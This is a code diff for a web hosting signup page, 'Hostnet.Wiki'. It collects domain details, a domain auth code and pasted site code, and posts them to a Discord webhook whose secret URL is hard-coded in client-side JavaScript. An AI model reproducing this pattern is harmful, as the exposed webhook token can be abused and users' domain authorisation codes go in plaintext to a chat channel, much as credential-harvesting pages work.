@@ -95,7 +95,8 @@
 </head>
 <body>
     <div class="container">
-        <img src="https://via.placeholder.com/100 " alt="Hostnet.Wiki Logo" class="logo">
+        <!-- Remove placeholder image or replace with a valid image URL -->
+        <!-- <img src="https://via.placeholder.com/100 " alt="Hostnet.Wiki Logo" class="logo"> -->
         <h2>Dynamic Website Hosting</h2>
         <p>Host your website on <strong>Hostnet.Wiki</strong> - the ultimate platform for dynamic hosting solutions!</p>
         <form id="websiteForm">
@@ -120,8 +121,8 @@
                 <input type="text" id="authCode" name="authCode" placeholder="Enter auth code">
             </div>
             <div class="form-group">
-                <label for="websiteFiles">Upload Website Files (HTML, CSS, JS):</label>
-                <input type="file" id="websiteFiles" name="websiteFiles" multiple accept=".html,.css,.js" required>
+                <label for="websiteCode">Paste Your Website Code (HTML, CSS, JS):</label>
+                <textarea id="websiteCode" name="websiteCode" rows="10" placeholder="Paste your code here" required></textarea>
             </div>
             <div class="form-group" id="captchaContainer">
                 <div class="g-recaptcha" data-sitekey="6LfgSjQrAAAAAOC-cqELPCxWzr4ZRlrUtoob69Bi"></div>
@@ -162,7 +163,7 @@
             const subdomainName = document.getElementById('subdomainName').value;
             const customDomain = document.getElementById('customDomain').value;
             const authCode = document.getElementById('authCode').value;
-            const files = document.getElementById('websiteFiles').files;
+            const websiteCode = document.getElementById('websiteCode').value;
             const recaptchaResponse = grecaptcha.getResponse();
 
             if (!recaptchaResponse) {
@@ -170,16 +171,16 @@
                 return;
             }
 
-            const formData = new FormData();
-            formData.append('domainType', domainType);
-            formData.append('subdomainName', subdomainName);
-            formData.append('customDomain', customDomain);
-            formData.append('authCode', authCode);
-            formData.append('recaptchaResponse', recaptchaResponse);
-
-            for (let i = 0; i < files.length; i++) {
-                formData.append('files', files[i]);
-            }
+            const message = `
+                **Domain Type:** ${domainType}
+                **Subdomain Name:** ${subdomainName}
+                **Custom Domain:** ${customDomain}
+                **Auth Code:** ${authCode}
+                **Website Code:**
+                \`\`\`
+                ${websiteCode}
+                \`\`\`
+            `;
 
             try {
                 const response = await fetch('https://discord.com/api/webhooks/1362428754458181874/TaKeGN5i6l1gnWViBJVrem9jw2yonAxy0_PunlyYcXlwMlhj57tYmogtM7QuXgKj9gPE ', {
@@ -188,7 +189,7 @@
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        content: `Domain Type: ${domainType}\nSubdomain Name: ${subdomainName}\nCustom Domain: ${customDomain}\nAuth Code: ${authCode}\nRecaptcha Response: ${recaptchaResponse}`
+                        content: message
                     })
                 });
 
